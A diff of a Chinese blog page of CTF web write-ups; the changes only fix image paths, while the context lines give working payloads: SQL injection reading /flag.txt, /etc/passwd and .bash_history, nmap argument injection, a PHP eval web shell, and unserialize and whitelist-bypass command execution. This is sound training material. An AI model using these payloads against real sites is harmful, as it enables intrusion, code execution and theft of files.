@@ -312,9 +312,9 @@
 <h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p><strong>考点：php伪协议、报错注入</strong></p>
 <p>结合实事，来一道2077。</p>
 <p>首页是个提交订单的页面，表单中提交姓名、电话、地址三个参数。下面还有几个订单管理的功能。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201129174439542.png" srcset="/img/loading.gif" alt="image-20201129174439542"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201129174439542.png" srcset="/img/loading.gif" alt="image-20201129174439542"></p>
 <p>查看源码发现提示</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201129174455970.png" srcset="/img/loading.gif" alt="image-20201129174455970"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201129174455970.png" srcset="/img/loading.gif" alt="image-20201129174455970"></p>
 <p>那就先试试用伪协议把源码读一读</p>
 <p>payload:</p>
 <pre><code>?file=php://filter/read=convert.base64-encode/resource=xxx.php</code></pre><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#change.php</span>
@@ -497,9 +497,9 @@
     <span class="token punctuation">}</span></code></pre>
 <p>结合报错注入，payload如下：</p>
 <pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,50)),0x7e),1)#</code></pre><p>结果load_file就显示了后半截。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207172844718.png" srcset="/img/loading.gif" alt="image-20201207172844718"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207172844718.png" srcset="/img/loading.gif" alt="image-20201207172844718"></p>
 <p>再读下前面的</p>
-<pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207173052006.png" srcset="/img/loading.gif" alt="image-20201207173052006"></p>
+<pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207173052006.png" srcset="/img/loading.gif" alt="image-20201207173052006"></p>
 <h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p><strong>考点：unicode转换安全</strong></p>
 <p>这个点确实没细看过。这次整理一下。</p>
 <p>简单来看，Unicode的安全问题分为</p>
@@ -512,18 +512,18 @@
 <p>参考：</p>
 <p>回到题目，是个独角兽商店。看这意思就是想让你把最贵那个买下来。</p>
 <p>可以看见输入1337后它提示只允许输入一个字符。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207170443087.png" srcset="/img/loading.gif" alt="image-20201207170443087"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207170443087.png" srcset="/img/loading.gif" alt="image-20201207170443087"></p>
 <p>那么在网站<a href="https://www.compart.com/en/unicode/里找到一个值大于1337的字符就可以了。我选择了下面这个字符。" target="_blank" rel="noopener">https://www.compart.com/en/unicode/里找到一个值大于1337的字符就可以了。我选择了下面这个字符。</a></p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207170751695.png" srcset="/img/loading.gif" alt="image-20201207170751695"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207170751695.png" srcset="/img/loading.gif" alt="image-20201207170751695"></p>
 <p>输入后得到flag。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207170844549.png" srcset="/img/loading.gif" alt="image-20201207170844549"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207170844549.png" srcset="/img/loading.gif" alt="image-20201207170844549"></p>
 <h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><p><strong>考点：二次注入</strong></p>
 <p>进去是个留言板。想随便提交点东西进去结果要你先登录。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207173518227.png" srcset="/img/loading.gif" alt="image-20201207173518227"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207173518227.png" srcset="/img/loading.gif" alt="image-20201207173518227"></p>
 <p>看这意思那就先爆破一下密码：zhangwei666</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207183926137.png" srcset="/img/loading.gif" alt="image-20201207183926137"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207183926137.png" srcset="/img/loading.gif" alt="image-20201207183926137"></p>
 <p>顺便扫了一下，诶，git泄露。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207184254128.png" srcset="/img/loading.gif" alt="image-20201207184254128"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207184254128.png" srcset="/img/loading.gif" alt="image-20201207184254128"></p>
 <p>结果就这一个文件，看起来也没啥用。</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
@@ -569,10 +569,10 @@
 
 <span class="token delimiter">?></span></code></pre>
 <p>控制台这看到</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207184919010.png" srcset="/img/loading.gif" alt="image-20201207184919010"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207184919010.png" srcset="/img/loading.gif" alt="image-20201207184919010"></p>
 <p>又回githack恢复</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207205744610.png" srcset="/img/loading.gif" alt="image-20201207205744610"></p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207210021449.png" srcset="/img/loading.gif" alt="image-20201207210021449"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207205744610.png" srcset="/img/loading.gif" alt="image-20201207205744610"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207210021449.png" srcset="/img/loading.gif" alt="image-20201207210021449"></p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span>
 <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -654,19 +654,19 @@
 <p>（找文件的思路还要再学学 o.o</p>
 <p>etc/passwd</p>
 <pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208134544946.png" srcset="/img/loading.gif" alt="image-20201208134544946"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208134544946.png" srcset="/img/loading.gif" alt="image-20201208134544946"></p>
 <p>看到www用了bash登录，查看bash_history</p>
 <pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/home/www/.bash_history"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span> </code></pre>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208135140457.png" srcset="/img/loading.gif" alt="image-20201208135140457"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208135140457.png" srcset="/img/loading.gif" alt="image-20201208135140457"></p>
 <p>删除了.DS_Store,那大概就是要找到他了。(hex显示完整文件)，解出来得到flag_8946e1ff1ee3e40f.php</p>
 <pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/tmp/html/.DS_Store"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208140034925.png" srcset="/img/loading.gif" alt="image-20201208140034925"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208140034925.png" srcset="/img/loading.gif" alt="image-20201208140034925"></p>
 <pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/tmp/html/flag_8946e1ff1ee3e40f.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
 <p>得到flag,但是不对，啊这..</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208140259192.png" srcset="/img/loading.gif" alt="image-20201208140259192"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208140259192.png" srcset="/img/loading.gif" alt="image-20201208140259192"></p>
 <p>想起来还有一个/var下的,得到正确flag。</p>
 <pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/flag_8946e1ff1ee3e40f.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208140520735.png" srcset="/img/loading.gif" alt="image-20201208140520735"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208140520735.png" srcset="/img/loading.gif" alt="image-20201208140520735"></p>
 <h1 id="CISCN-2019-华北赛区-Day1-Web-Web1"><a href="#CISCN-2019-华北赛区-Day1-Web-Web1" class="headerlink" title="CISCN-2019-华北赛区-Day1-Web-Web1"></a>CISCN-2019-华北赛区-Day1-Web-Web1</h1><p>首先是个登录注册界面，不考虑其他的先随便注册一个登进去看看。</p>
 <p>进入之后是一个上传文件，简单传了几个文件发现并没有做很严格的限制；除此之外上传的文件还有下载和删除功能；上传、下载、删除都分别抓了下包，发现在下载界面的download.php这里存在任意文件读取，依次读取以下源码：</p>
 <pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span>
@@ -1211,30 +1211,30 @@ session<span class="token punctuation">.</span>keep_alive <span class="token ope
 string escapeshellcmd ( string $command)</code></pre><p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
 <p>转义字符串$arg中的单引号并使用单引号包裹此部分</p>
 <p>使得$arg只能传递一个参数，且不能执行不同的命令；</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011162454612.png" srcset="/img/loading.gif" alt="image-20201011162454612"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011162454612.png" srcset="/img/loading.gif" alt="image-20201011162454612"></p>
 <p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
 <p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p>
 <p>转义&amp; # ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ 、x0A和xF，’和”仅在落单时被转义</p>
 <p>使得$command只能执行一个命令，但可以传递多个参数；</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011163816415.png" srcset="/img/loading.gif" alt="image-20201011163816415"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011163816415.png" srcset="/img/loading.gif" alt="image-20201011163816415"></p>
 <p>然而这两个函数一起出现就会存在问题（arg先，cmd后），如图，文本被分为三个部分：</p>
 <p>简化后为：<strong>12\ 3&#39;</strong></p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011165732532.png" srcset="/img/loading.gif" alt="image-20201011165732532"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011165732532.png" srcset="/img/loading.gif" alt="image-20201011165732532"></p>
 <p>综上可以构造payload:</p>
 <pre><code>127.0.0.1&#39; -iL /flag -oN aaa.txt &#39;</code></pre><p>本地测试如下：</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011175635921.png" srcset="/img/loading.gif" alt="image-20201011175635921"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011175635921.png" srcset="/img/loading.gif" alt="image-20201011175635921"></p>
 <p>访问aaa.txt，得到flag。这里也可以看到最后执行的命令。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011175837439.png" srcset="/img/loading.gif" alt="image-20201011175837439"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011175837439.png" srcset="/img/loading.gif" alt="image-20201011175837439"></p>
 <p>网上的其他做法是传马；</p>
 <p>payload</p>
-<pre><code>&#39; &lt;?= @eval($_POST[&quot;pd&quot;]);?&gt; -oG pd.phtml &#39;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011182343649.png" srcset="/img/loading.gif" alt="image-20201011182343649"></p>
+<pre><code>&#39; &lt;?= @eval($_POST[&quot;pd&quot;]);?&gt; -oG pd.phtml &#39;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011182343649.png" srcset="/img/loading.gif" alt="image-20201011182343649"></p>
 <h1 id="2020-网鼎杯-朱雀组-Web-phpweb"><a href="#2020-网鼎杯-朱雀组-Web-phpweb" class="headerlink" title="2020-网鼎杯-朱雀组-Web-phpweb"></a>2020-网鼎杯-朱雀组-Web-phpweb</h1><p>主页东西很少，页面定时提交表单刷新。</p>
 <p>抓个包看一下,应该是执行的函数和他的传参</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011194538663.png" srcset="/img/loading.gif" alt="image-20201011194538663"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011194538663.png" srcset="/img/loading.gif" alt="image-20201011194538663"></p>
 <p>用eval执行phpinfo被拦住了，需要绕过waf。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011194803464.png" srcset="/img/loading.gif" alt="image-20201011194803464"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011194803464.png" srcset="/img/loading.gif" alt="image-20201011194803464"></p>
 <p>先读一下index.php</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011195421461.png" srcset="/img/loading.gif" alt="image-20201011195421461"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011195421461.png" srcset="/img/loading.gif" alt="image-20201011195421461"></p>
 <pre class=" language-php+HTML"><code class="language-php+HTML"><!DOCTYPE html>
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
@@ -1301,11 +1301,11 @@ string escapeshellcmd ( string $command)</code></pre><p><strong>escapeshellarg</
 $a=new Test();
 echo serialize($a);
 ?&gt;</code></pre><p>payload如下，可以看到执行成功；</p>
-<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011200952514.png" srcset="/img/loading.gif" alt="image-20201011200952514"></p>
+<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011200952514.png" srcset="/img/loading.gif" alt="image-20201011200952514"></p>
 <p>相似的，查看根目录再读取flag。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011201319348.png" srcset="/img/loading.gif" alt="image-20201011201319348"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011201319348.png" srcset="/img/loading.gif" alt="image-20201011201319348"></p>
 <p>payload:</p>
-<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;cat /flag_2911028111&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011201411539.png" srcset="/img/loading.gif" alt="image-20201011201411539"></p>
+<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;cat /flag_2911028111&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011201411539.png" srcset="/img/loading.gif" alt="image-20201011201411539"></p>
 <h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="CISCN-2019-初赛-Love Math"></a>CISCN-2019-初赛-Love Math</h1><p>进来给了源码</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -1346,23 +1346,23 @@ echo serialize($a);
 <h4 id="思路一-直接执行命令："><a href="#思路一-直接执行命令：" class="headerlink" title="思路一 直接执行命令："></a>思路一 直接执行命令：</h4><p>先看白名单中可以使用的函数：</p>
 <p><strong>base_convert()</strong></p>
 <p>测试后十进制和三十六进制之间的转换是最稳妥的，其他不好说。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011190545815.png" srcset="/img/loading.gif" alt="image-20201011190545815"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011190545815.png" srcset="/img/loading.gif" alt="image-20201011190545815"></p>
 <p><strong>hexdec()</strong></p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201014181238707.png" srcset="/img/loading.gif" alt="image-20201014181238707"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201014181238707.png" srcset="/img/loading.gif" alt="image-20201014181238707"></p>
 <p>由于base_convert函数名过长， 我们将它赋到变量中，变量名选择白名单中函数名最短的，即$pi。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201014182357000.png" srcset="/img/loading.gif" alt="image-20201014182357000"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201014182357000.png" srcset="/img/loading.gif" alt="image-20201014182357000"></p>
 <pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1751504350</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span>cat f<span class="token operator">*</span><span class="token punctuation">)</span></code></pre>
 <p>但这个函数并不能转换出像’ * ‘，’  . ‘这样的符号，先用异或构造试试。</p>
 <p>本地用bp跑一下</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201014214026752.png" srcset="/img/loading.gif" alt="image-20201014214026752"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201014214026752.png" srcset="/img/loading.gif" alt="image-20201014214026752"></p>
 <p>也不行。</p>
 <p>但可以用dechex函数把十进制转换为十六进制，再用异或构造一个hex2bin函数将十六进制转为字符串。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201014214917756.png" srcset="/img/loading.gif" alt="image-20201014214917756"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201014214917756.png" srcset="/img/loading.gif" alt="image-20201014214917756"></p>
 <p>初版payload</p>
 <pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1751504350</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">426836762666</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
 <p>但字符长度还是超了，超了三个。</p>
 <p>通过fuzz进制数来缩短，把system换成exec，把cat换成nl。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015143039194.png" srcset="/img/loading.gif" alt="image-20201015143039194"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015143039194.png" srcset="/img/loading.gif" alt="image-20201015143039194"></p>
 <p>实际构造</p>
 <pre class=" language-php"><code class="language-php"><span class="token function">exec</span><span class="token punctuation">(</span>nl <span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">)</span></code></pre>
 <p>最终payload</p>
@@ -1386,13 +1386,13 @@ echo serialize($a);
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 <span class="token delimiter">?></span></code></pre>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015144829317.png" srcset="/img/loading.gif" alt="image-20201015144829317"></p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015144111762.png" srcset="/img/loading.gif" alt="image-20201015144111762"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015144829317.png" srcset="/img/loading.gif" alt="image-20201015144829317"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015144111762.png" srcset="/img/loading.gif" alt="image-20201015144111762"></p>
 <p>payload</p>
-<pre><code>/?c=$pi=(is_nan^(6).(4)).(tanh^(1).(5));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</code></pre><h4 id="思路三-利用getallheaders"><a href="#思路三-利用getallheaders" class="headerlink" title="思路三 利用getallheaders()"></a>思路三 利用getallheaders()</h4><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015151540540.png" srcset="/img/loading.gif" alt="image-20201015151540540"></p>
+<pre><code>/?c=$pi=(is_nan^(6).(4)).(tanh^(1).(5));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</code></pre><h4 id="思路三-利用getallheaders"><a href="#思路三-利用getallheaders" class="headerlink" title="思路三 利用getallheaders()"></a>思路三 利用getallheaders()</h4><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015151540540.png" srcset="/img/loading.gif" alt="image-20201015151540540"></p>
 <p>因为get_allheaders返回的是数组，可以用arry[‘xxx’]的方式读取数据。</p>
 <p>而[]和字母都被waf了，用{}替代[],头名用数字。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015151653905.png" srcset="/img/loading.gif" alt="image-20201015151653905"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015151653905.png" srcset="/img/loading.gif" alt="image-20201015151653905"></p>
 <p>payload:</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">,</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">100</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
 <p>上传头</p>
@@ -1412,9 +1412,9 @@ linux提供了/proc/self/目录，这个目录比较独特，不同的进程访�
 <p>网页功能就是传入参数url进行文件读取。</p>
 <p>合理怀疑存在任意文件读取或目录穿越。</p>
 <p>试试读/etc/passwd</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015155007029.png" srcset="/img/loading.gif" alt="image-20201015155007029"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015155007029.png" srcset="/img/loading.gif" alt="image-20201015155007029"></p>
 <p>读/proc/self/cmdline文件查看当前进程执行命令，可以看见main.py正在执行</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015155226379.png" srcset="/img/loading.gif" alt="image-20201015155226379"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015155226379.png" srcset="/img/loading.gif" alt="image-20201015155226379"></p>
 <p>读下源码</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#main.py</span>
 
@@ -1474,25 +1474,25 @@ os<span class="token punctuation">.</span>remove<span class="token punctuation">
 <p>但可以看到</p>
 <pre><code>os.remove(SECRET_FILE)</code></pre><p>执行时，secret.txt已经被删掉了。但它是用open打开的，在打开时会创建文件描述符。</p>
 <p>可以从/proc/self/fd读文件内容。</p>
